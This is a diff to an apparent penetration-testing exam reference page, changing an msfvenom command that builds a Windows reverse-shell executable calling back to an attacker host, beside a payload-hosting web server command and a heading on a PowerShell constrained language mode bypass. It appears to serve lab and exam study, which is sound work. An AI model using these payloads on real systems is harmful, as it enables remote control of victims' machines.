@@ -459,8 +459,8 @@ python3 -m http.server 8000 --directory .
 ss -lntp | grep ":$LPORT"
 ip route get $TARGET
 
-# Generate only the required architecture/format.
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe</code></pre>
+# Preferred general Windows command-shell payload; use x64-specific only when required.
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe</code></pre>
 <p>If a payload is removed or blocked, capture the exact symptom and reconsider the delivery/execution primitive. Repacking, encoder chains, memory patches and broad security-control disabling are poor default exam-time debugging strategies.</p>
 </details>
 <details id="ref-16-4-constrained-language-mode-bypass">
